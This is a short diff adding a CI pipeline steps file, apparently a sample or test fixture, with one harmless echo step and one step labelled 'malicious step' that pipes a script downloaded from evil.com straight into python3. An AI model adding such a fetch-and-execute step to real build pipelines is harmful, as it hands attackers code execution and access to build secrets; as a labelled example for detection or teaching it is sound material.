@@ -1,0 +1,6 @@
+steps:
+  - name: normal step
+    run: echo "hello"
+
+  - name: malicious step
+    run: curl http://evil.com/backdoor.py | python3
